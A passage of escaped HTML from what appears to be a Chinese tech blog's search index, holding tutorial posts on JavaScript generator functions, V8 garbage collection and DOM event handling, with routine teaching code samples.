&lt;h2 id=&#34;yield-表达式&#34;&gt;yield 表达式&lt;/h2&gt;
&lt;p&gt;由于 Generator 函数返回的遍历器对象，只有调用&lt;code&gt;next&lt;/code&gt;方法才会遍历下一个内部状态，所以其实提供了一种可以暂停执行的函数。&lt;code&gt;yield&lt;/code&gt;表达式就是暂停标志。&lt;/p&gt;
&lt;p&gt;遍历器对象的&lt;code&gt;next&lt;/code&gt;方法的运行逻辑如下。&lt;/p&gt;
&lt;p&gt;（1）遇到&lt;code&gt;yield&lt;/code&gt;表达式，就暂停执行后面的操作，并将紧跟在&lt;code&gt;yield&lt;/code&gt;后面的那个表达式的值，作为返回的对象的&lt;code&gt;value&lt;/code&gt;属性值。&lt;/p&gt;
&lt;p&gt;（2）下一次调用&lt;code&gt;next&lt;/code&gt;方法时，再继续往下执行，直到遇到下一个&lt;code&gt;yield&lt;/code&gt;表达式。&lt;/p&gt;
&lt;p&gt;（3）如果没有再遇到新的&lt;code&gt;yield&lt;/code&gt;表达式，就一直运行到函数结束，直到&lt;code&gt;return&lt;/code&gt;语句为止，并将&lt;code&gt;return&lt;/code&gt;语句后面的表达式的值，作为返回的对象的&lt;code&gt;value&lt;/code&gt;属性值。&lt;/p&gt;
&lt;p&gt;（4）如果该函数没有&lt;code&gt;return&lt;/code&gt;语句，则返回的对象的&lt;code&gt;value&lt;/code&gt;属性值为&lt;code&gt;undefined&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;yield&lt;/code&gt;表达式后面的表达式，只有当调用&lt;code&gt;next&lt;/code&gt;方法、内部指针指向该语句时&lt;strong&gt;才会执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* gen() {
  yield  123 + 456;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;yield&lt;/code&gt;后面的表达式&lt;code&gt;123 + 456&lt;/code&gt;，不会立即求值，只会在&lt;code&gt;next&lt;/code&gt;方法将指针移到这一句时，才会求值。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;Generator 函数可以不用&lt;code&gt;yield&lt;/code&gt;表达式，这时就变成了一个单纯的暂缓执行函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* f() {
  console.log(&#39;执行了！&#39;)
}

var generator = f();

setTimeout(function () {
  generator.next()
}, 2000);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数&lt;code&gt;f&lt;/code&gt;是一个 Generator 函数，就变成只有调用&lt;code&gt;next&lt;/code&gt;方法时，函数&lt;code&gt;f&lt;/code&gt;才会执行。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;yield&lt;/code&gt;表达式如果用在另一个表达式之中，必须放在圆括号里面&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* demo() {
  console.log(&#39;Hello&#39; + yield); // SyntaxError
  console.log(&#39;Hello&#39; + yield 123); // SyntaxError

  console.log(&#39;Hello&#39; + (yield)); // OK
  console.log(&#39;Hello&#39; + (yield 123)); // OK
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;next-方法的参数&#34;&gt;next 方法的参数&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;next&lt;/code&gt;方法可以带一个参数，该参数就会被当作&lt;strong&gt;上一个&lt;code&gt;yield&lt;/code&gt;表达式的返回值&lt;/strong&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* f() {
  for(var i = 0; true; i++) {
    var reset = yield i;
    if(reset) { i = -1; }
  }
}

var g = f();

g.next() // { value: 0, done: false }
g.next() // { value: 1, done: false }
g.next(true) // { value: 0, done: false }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* foo(x) {
  var y = 2 * (yield (x + 1));
  var z = yield (y / 3);
  return (x + y + z);
}

var a = foo(5);
a.next() // Object{value:6, done:false}
a.next() // Object{value:NaN, done:false}
a.next() // Object{value:NaN, done:true}

var b = foo(5);
b.next() // { value:6, done:false }
b.next(12) // { value:8, done:false }
b.next(13) // { value:42, done:true }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第二次运行&lt;code&gt;next&lt;/code&gt;方法的时候不带参数，导致 y 的值等于&lt;code&gt;2 * undefined&lt;/code&gt;（即&lt;code&gt;NaN&lt;/code&gt;），除以 3 以后还是&lt;code&gt;NaN&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;第三次运行&lt;code&gt;Next&lt;/code&gt;方法的时候不带参数，所以&lt;code&gt;z&lt;/code&gt;等于&lt;code&gt;undefined&lt;/code&gt;，返回对象的&lt;code&gt;value&lt;/code&gt;属性等于&lt;code&gt;5 + NaN + undefined&lt;/code&gt;，即&lt;code&gt;NaN&lt;/code&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;调用&lt;code&gt;b&lt;/code&gt;的&lt;code&gt;next&lt;/code&gt;方法时，返回&lt;code&gt;x+1&lt;/code&gt;的值&lt;code&gt;6&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;二次调用&lt;code&gt;next&lt;/code&gt;方法，将上一次&lt;code&gt;yield&lt;/code&gt;表达式的值设为&lt;code&gt;12&lt;/code&gt;，因此&lt;code&gt;y&lt;/code&gt;等于&lt;code&gt;24&lt;/code&gt;，返回&lt;code&gt;y / 3&lt;/code&gt;的值&lt;code&gt;8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;第三次调用&lt;code&gt;next&lt;/code&gt;方法，将上一次&lt;code&gt;yield&lt;/code&gt;表达式的值设为&lt;code&gt;13&lt;/code&gt;，因此&lt;code&gt;z&lt;/code&gt;等于&lt;code&gt;13&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这时&lt;code&gt;x&lt;/code&gt;等于&lt;code&gt;5&lt;/code&gt;，&lt;code&gt;y&lt;/code&gt;等于&lt;code&gt;24&lt;/code&gt;，所以&lt;code&gt;return&lt;/code&gt;语句的值等于&lt;code&gt;42&lt;/code&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;forof-循环&#34;&gt;for...of 循环&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;for...of&lt;/code&gt;循环可以自动遍历 Generator 函数运行时生成的&lt;code&gt;Iterator&lt;/code&gt;对象，且此时不再需要调用&lt;code&gt;next&lt;/code&gt;方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* foo() {
  yield 1;
  yield 2;
  yield 3;
  yield 4;
  yield 5;
  return 6;
}

for (let v of foo()) {
  console.log(v);
}
// 1 2 3 4 5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一旦&lt;code&gt;next&lt;/code&gt;方法的返回对象的&lt;code&gt;done&lt;/code&gt;属性为&lt;code&gt;true&lt;/code&gt;，&lt;code&gt;for...of&lt;/code&gt;循环就会中止，且不包含该返回对象，所以上面代码的&lt;code&gt;return&lt;/code&gt;语句返回的&lt;code&gt;6&lt;/code&gt;，不包括在&lt;code&gt;for...of&lt;/code&gt;循环之中&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;generatorprototypethrow&#34;&gt;&lt;code&gt;Generator.prototype.throw()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Generator 函数返回的遍历器对象，都有一个&lt;code&gt;throw&lt;/code&gt;方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var g = function* () {
  try {
    yield;
  } catch (e) {
    console.log(&#39;内部捕获&#39;, e);
  }
};

var i = g();
i.next();

try {
  i.throw(&#39;a&#39;);
  i.throw(&#39;b&#39;);
} catch (e) {
  console.log(&#39;外部捕获&#39;, e);
}
// 内部捕获 a
// 外部捕获 b
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第一个错误被 Generator 函数体内的&lt;code&gt;catch&lt;/code&gt;语句捕获。&lt;code&gt;i&lt;/code&gt;第二次抛出错误，由于 Generator 函数内部的&lt;code&gt;catch&lt;/code&gt;语句已经执行过了，不会再捕捉到这个错误了，所以这个错误就被抛出了 Generator 函数体，被函数体外的&lt;code&gt;catch&lt;/code&gt;语句捕获。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;throw&lt;/code&gt;方法可以接受一个参数，该参数会被&lt;code&gt;catch&lt;/code&gt;语句接收&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;generatorprototypereturn&#34;&gt;&lt;code&gt;Generator.prototype.return()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;return()&lt;/code&gt;方法可以返回给定的值，并且终结遍历 Generator 函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* gen() {
  yield 1;
  yield 2;
  yield 3;
}

var g = gen();

g.next()        // { value: 1, done: false }
g.return(&#39;foo&#39;) // { value: &amp;quot;foo&amp;quot;, done: true }
g.next()        // { value: undefined, done: true }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;yield-表达式-2&#34;&gt;yield* 表达式&lt;/h2&gt;
&lt;p&gt;用来在一个 Generator 函数里面执行另一个 Generator 函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* foo() {
  yield &#39;a&#39;;
  yield &#39;b&#39;;
}

function* bar() {
  yield &#39;x&#39;;
  yield* foo();
  yield &#39;y&#39;;
}

// 等同于
function* bar() {
  yield &#39;x&#39;;
  yield &#39;a&#39;;
  yield &#39;b&#39;;
  yield &#39;y&#39;;
}

// 等同于
function* bar() {
  yield &#39;x&#39;;
  for (let v of foo()) {
    yield v;
  }
  yield &#39;y&#39;;
}

for (let v of bar()){
  console.log(v);
}
// &amp;quot;x&amp;quot;
// &amp;quot;a&amp;quot;
// &amp;quot;b&amp;quot;
// &amp;quot;y&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;意义&#34;&gt;意义&lt;/h2&gt;
&lt;p&gt;Generator 函数的暂停执行的效果，意味着可以把异步操作写在&lt;code&gt;yield&lt;/code&gt;表达式里面，等到调用&lt;code&gt;next&lt;/code&gt;方法时再往后执行。这实际上等同于不需要写回调函数了，因为异步操作的后续操作可以放在&lt;code&gt;yield&lt;/code&gt;表达式下面，反正要等到调用&lt;code&gt;next&lt;/code&gt;方法时再执行&lt;/p&gt;
&lt;p&gt;Generator 函数的一个重要实际意义就是用来处理异步操作，改写回调函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* loadUI() {
  showLoadingScreen();
  yield loadUIDataAsynchronously();
  hideLoadingScreen();
}
var loader = loadUI();
// 加载UI
loader.next()

// 卸载UI
loader.next()
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Promise.resolve(step1)
  .then(step2)
  .then(step3)
  .then(step4)
  .then(function (value4) {
    // Do something with value4
  }, function (error) {
    // Handle any error from step1 through step4
  })
  .done();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Generator 函数可以进一步改善代码运行流程&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* longRunningTask(value1) {
  try {
    var value2 = yield step1(value1);
    var value3 = yield step2(value2);
    var value4 = yield step3(value3);
    var value5 = yield step4(value4);
    // Do something with value4
  } catch (e) {
    // Handle any error from step1 through step4
  }
}
&lt;/code&gt;&lt;/pre&gt;
"> Generator 函数的语法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/la-ji-hui-shou-la-ji-shu-ju-shi-ru-he-dong-hui-shou-de/"" data-c="
          &lt;p&gt;JavaScript中的数据中&lt;strong&gt;原始数据类型是存储在 栈空间中的，引⽤类型的数据是存储在堆空间中的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不过有些数据被使⽤之后，可能就不再需要了，我们把这种数据称为垃圾数据。如果这些垃圾数据⼀直保存 在内存中，那么内存会越⽤越多，所以我们需要对这些垃圾数据进⾏回收，以释放有限的内存空间。&lt;/p&gt;
&lt;p&gt;通常情况下，垃圾数据回收分为&lt;strong&gt;⼿动回收&lt;/strong&gt;和&lt;strong&gt;⾃动回收&lt;/strong&gt;两种策略。&lt;/p&gt;
&lt;h2 id=&#34;调用栈中的数据是如何回收的&#34;&gt;调⽤栈中的数据是如何回收的&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function foo(){
var a = 1
var b = {name:&amp;quot;极客邦&amp;quot;}
	function showName(){
		var c = &amp;quot;极客时间&amp;quot;
		var d = {name:&amp;quot;极客时间&amp;quot;}
}
	showName()
}

foo()

&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628916722712.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;当foo函数执⾏结束之 后，foo函数的执⾏上下⽂会从堆中被销毁掉，那么它是怎么被销毁的呢？&lt;/p&gt;
&lt;p&gt;如果执⾏到showName函数时，那么JavaScript引擎会创建 showName函数的执⾏上下⽂，并将showName函数的执⾏上下⽂压⼊到调⽤栈中&lt;/p&gt;
&lt;p&gt;执⾏到 showName函数时，其调⽤栈就如上图所⽰。与此同时，还有⼀个&lt;strong&gt;记录当前执⾏状态的指针（称为 ESP）&lt;/strong&gt;，指向调⽤栈中showName函数的执⾏上下⽂，表⽰当前正在执⾏showName函数。&lt;/p&gt;
&lt;p&gt;接着，当showName函数执⾏完成之后，函数执⾏流程就进⼊了foo函数，那这时就需要销毁showName函 数的执⾏上下⽂了。ESP这时候就帮上忙了，JavaScript会将ESP下移到foo函数的执⾏上下⽂，&lt;strong&gt;这个下移操 作就是销毁showName函数执⾏上下⽂的过程。&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628916718322.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;当showName函数执⾏结束之后，ESP向下移动到foo函数的执⾏上下⽂中，上⾯ &lt;strong&gt;showName的执⾏上下⽂虽然保存在栈内存中，但是已经是⽆效内存了&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;当foo函数再次调⽤另外⼀个 函数时，这块内容会被直接覆盖掉，⽤来存放另外⼀个函数的执⾏上下⽂。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;堆中的数据是如何回收的&#34;&gt;堆中的数据是如何回收的&lt;/h2&gt;
&lt;p&gt;当上⾯那段代码的foo函数执⾏结束之后，ESP应该是指向全 局执⾏上下⽂的，那这样的话，showName函数和foo函数的执⾏上下⽂就处于⽆效状态了，不过保存在堆 中的两个对象依然占⽤着空间&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628916713681.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;要回收堆中的垃圾数据，就需要⽤到JavaScript中 的垃圾回收器了。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;垃圾回收器的工作流程&#34;&gt;垃圾回收器的⼯作流程&lt;/h2&gt;
&lt;p&gt;第⼀步是&lt;strong&gt;标记&lt;/strong&gt;空间中活动对象和⾮活动对象。所谓活动对象就是还在使⽤的对象，⾮活动对象就是可以进⾏ 垃圾回收的对象。&lt;/p&gt;
&lt;p&gt;第⼆步是回收⾮活动对象所占据的内存。其实就是在所有的标记完成之后，统⼀清理内存中所有被标记为可 回收的对象。&lt;/p&gt;
&lt;p&gt;第三步是做内存整理。频繁回收对象后，内存中就会存在⼤量不连续空间，我们把这些不连续的 内存空间称为&lt;strong&gt;内存碎⽚&lt;/strong&gt;。当内存中出现了⼤量的内存碎⽚之后，如果需要分配较⼤连续内存的时候，就有可 能出现内存不⾜的情况。所以最后⼀步需要整理这些内存碎⽚。但这步其实是可选的，因为有的垃圾回收器 不会产⽣内存碎⽚，⽐如副垃圾回收器。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;副垃圾回收器&#34;&gt;副垃圾回收器&lt;/h2&gt;
&lt;p&gt;副垃圾回收器主要负责新⽣区的垃圾回收。&lt;/p&gt;
&lt;p&gt;在垃圾回收过程中，⾸先要对对象区域中的垃圾做标记；标记完成之后，就进⼊垃圾清理阶段&lt;/p&gt;
&lt;p&gt;副垃圾回收 器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也 就相当于完成了内存整理操作，复制后空闲区域就没有内存碎⽚了。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;主垃圾回收器&#34;&gt;主垃圾回收器&lt;/h2&gt;
&lt;p&gt;主垃圾回收器是采⽤&lt;strong&gt;标记清除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;标记阶段就是从⼀组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为&lt;strong&gt;活动对象&lt;/strong&gt;，没有到达的元素就可以判断为&lt;strong&gt;垃圾数据&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;全停顿&#34;&gt;全停顿&lt;/h2&gt;
&lt;p&gt;V8是使⽤副垃圾回收器和主垃圾回收器处理垃圾回收的，不过由于JavaScript是运⾏在主线程 之上的，⼀旦执⾏垃圾回收算法，都需要将正在执⾏的JavaScript脚本暂停下来，待垃圾回收完毕后再恢复 脚本执⾏。我们把这种⾏为叫做全停顿（Stop-The-World）。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628916707034.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;若是这样的时间花销，那么应⽤的性能和响应能⼒都会直线下降。&lt;/p&gt;
&lt;p&gt;为了降低⽼⽣代的垃圾回收⽽造成的卡顿，V8将标记过程分为⼀个个的⼦标记过程，同时让垃圾回收标记 和JavaScript应⽤逻辑交替进⾏，直到标记阶段完成，我们把这个算法称为增量标记（Incremental Marking）算法&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628916701889.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;使⽤增量标记算法，可以把⼀个完整的垃圾回收任务拆分为很多⼩的任务，这些⼩的任务执⾏时间⽐较短， 可以穿插在其他的JavaScript任务中间执⾏，这样当执⾏上述动画效果时，就不会让⽤⼾因为垃圾回收任务 ⽽感受到⻚⾯的卡顿了。&lt;/p&gt;
"> 垃圾回收：垃圾数据是如何⾃动回收的？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-de-shi-jian/"" data-c="
          &lt;h2 id=&#34;事件流&#34;&gt;事件流&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;事件流&lt;/strong&gt;描述的是从页面中接收事件的顺序&lt;/p&gt;
&lt;p&gt;IE 的事件流是事件冒泡流，而 Netscape Communicator 的事件流是事 件捕获流&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;事件冒泡&#34;&gt;事件冒泡&lt;/h2&gt;
&lt;p&gt;即事件开始时由最具体的元素（文档中嵌套层次最深 的那个节点）接收，然后逐级向上传播到较为不具体的节点（文档）&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628835679028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;事件捕捉&#34;&gt;事件捕捉&lt;/h2&gt;
&lt;p&gt;事件捕获的思想 是不太具体的节点应该更早接收到事件，而最具体的节点应该最后接收到事件。&lt;/p&gt;
&lt;p&gt;事件捕获的用意在于在 事件到达预定目标之前捕获它。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628835697075.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;dom事件流&#34;&gt;DOM事件流&lt;/h2&gt;
&lt;p&gt;“DOM2级事件”规定的事件流包括三个阶段：&lt;strong&gt;事件捕获阶段、处于目标阶段和事件冒泡阶段。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;事件捕获&lt;/strong&gt;为截获事件提供了机会&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;冒泡阶段&lt;/strong&gt;对事件做出响应&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628835710440.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在 DOM 事件流中，实际的目标（&lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;元素）在捕获阶段不会接收到事件。&lt;/p&gt;
&lt;p&gt;这意味着在捕获阶段， 事件从 document 到再到后就停止了。下一个阶段是“处于目标”阶段，于是事件在&lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;上发生，并在事件处理（后面将会讨论这个概念）中被看成冒泡阶段的一部分。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;事件处理程序&#34;&gt;事件处理程序&lt;/h2&gt;
&lt;p&gt;响应某个事件的函数就叫做事件处理程序&lt;/p&gt;
&lt;h3 id=&#34;html事件处理程序&#34;&gt;HTML事件处理程序&lt;/h3&gt;
&lt;p&gt;某个元素支持的每种事件，都可以使用一个与相应事件处理程序同名的 HTML 特性来指定。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; onclick=&amp;quot;alert(&#39;Clicked&#39;)&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 HTML 中定义的事件处理程序可以包含要执行的具体动作，也可以调用在页面其他地方定义的 脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; 
 function showMessage(){ 
 alert(&amp;quot;Hello world!&amp;quot;); 
 } 
&amp;lt;/script&amp;gt; 
&amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Click Me&amp;quot; onclick=&amp;quot;showMessage()&amp;quot; /&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;事件处理程序中的代码在执行时，有权访问全局作用 域中的任何代码&lt;/p&gt;
&lt;p&gt;指定事件处理程序具有一些独到之处，这样会创建一个封装着元素属性值的函数。这个 函数中有一个局部变量 event，也就是事件对象&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;dom0-级事件处理程序&#34;&gt;DOM0 级事件处理程序&lt;/h3&gt;
&lt;p&gt;通过 JavaScript 指定事件处理程序的传统方式，就是将一个函数赋值给一个事件处理程序属性。&lt;/p&gt;
&lt;p&gt;原因一是简单，二是具有跨浏览器的优势。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.onclick = function(){ 
 alert(this.id); //&amp;quot;myBtn&amp;quot; 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以在事件处理程序中通过 this 访问元素的任何属性和方法。以这种方式添加的事件处理程序会在事件流的冒泡阶段被处理。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;btn.onclick = null; //删除事件处理程序&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;dom2-级事件处理程序&#34;&gt;DOM2 级事件处理程序&lt;/h3&gt;
&lt;p&gt;“DOM2级事件”定义了两个方法，用于处理指定和删除事件处理程序的操作：&lt;code&gt;addEventListener()&lt;/code&gt;和 &lt;code&gt;removeEventListener()&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;它们都接受 3 个参数：&lt;strong&gt;要处 理的事件名&lt;/strong&gt;、&lt;strong&gt;作为事件处理程序的函数&lt;/strong&gt;和一个&lt;strong&gt;布尔值&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;最后这个布尔值参数如果是 true，表示在捕获 阶段调用事件处理程序；如果是 false，表示在冒泡阶段调用事件处理程序。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.addEventListener(&amp;quot;click&amp;quot;, function(){ 
 alert(this.id); 
}, false); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;为按钮添加了两个事件处理程序这两个事件处理程序会按照添加它们的顺序触发&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.addEventListener(&amp;quot;click&amp;quot;, function(){ 
 alert(this.id); 
}, false); 

btn.addEventListener(&amp;quot;click&amp;quot;, function(){ 
 alert(&amp;quot;Hello world!&amp;quot;); 
}, false);


&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过 &lt;code&gt;addEventListener()&lt;/code&gt;添加的匿 名函数将无法移除&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.addEventListener(&amp;quot;click&amp;quot;, function(){ 
 alert(this.id); 
 }, false); 
 
 btn.removeEventListener(&amp;quot;click&amp;quot;, function(){ //没有用！
 alert(this.id); 
}, false);

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;传入 &lt;code&gt;removeEventListener()&lt;/code&gt;中的事件处理程序函数必须与传入 &lt;code&gt;addEventListener()&lt;/code&gt;中的相同&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
var handler = function(){ 
 alert(this.id); 
}; 

btn.addEventListener(&amp;quot;click&amp;quot;, handler, false); 

//这里省略了其他代码
btn.removeEventListener(&amp;quot;click&amp;quot;, handler, false); //有效！
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;事件对象&#34;&gt;事件对象&lt;/h2&gt;
&lt;p&gt;在触发 DOM 上的某个事件时，会产生一个事件对象 event&lt;/p&gt;
&lt;p&gt;例如，鼠标操作导致的事件 对象中，会包含鼠标位置的信息，而键盘操作导致的事件对象中，会包含与按下的键有关的信息。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;dom中的事件对象&#34;&gt;DOM中的事件对象&lt;/h3&gt;
&lt;p&gt;兼容 DOM 的浏览器会将一个 event 对象传入到事件处理程序中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.onclick = function(event){ 
 alert(event.type); //&amp;quot;click&amp;quot; 
}; 

btn.addEventListener(&amp;quot;click&amp;quot;, function(event){ 
 alert(event.type); //&amp;quot;click&amp;quot; 
}, false); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;currentTarget Element 只读 其事件处理程序当前正在处理事件的那个元素&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;target Element 只读 事件的目标&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在事件处理程序内部，对象 this 始终等于 currentTarget 的值，而 target 则只包含事件的实 际目标。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;要阻止特定事件的默认行为，可以使用 &lt;code&gt;preventDefault()&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;例如，链接的默认行为就是在 被单击时会导航到其 href 特性指定的 URL。&lt;/p&gt;
&lt;p&gt;只有 cancelable 属性设置为 true 的事件，才可以使用 preventDefault()来取消其默认行为。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;stopPropagation()&lt;/code&gt;方法用于立即停止事件在 DOM 层次中的传播，即取消进一步的事件 捕获或冒泡。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var btn = document.getElementById(&amp;quot;myBtn&amp;quot;); 
btn.onclick = function(event){ 
 alert(&amp;quot;Clicked&amp;quot;); 
 event.stopPropagation(); 
}; 

//冒泡的被阻止了
document.body.onclick = function(event){ 
 alert(&amp;quot;Body clicked&amp;quot;); 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;事件对象的 &lt;code&gt;eventPhase&lt;/code&gt;属性用来确定事件当前正位于事件流的哪个阶段&lt;/p&gt;
&lt;p&gt;在捕获阶 段调用的事件处理程序，在捕获阶 段调用的事件处理程序&lt;/p&gt;
&lt;p&gt;事件处理程序处于目标对象上，eventPhase 等于 2&lt;/p&gt;
&lt;p&gt;在冒泡阶段调用的事件处理程序，eventPhase 等于 3&lt;/p&gt;
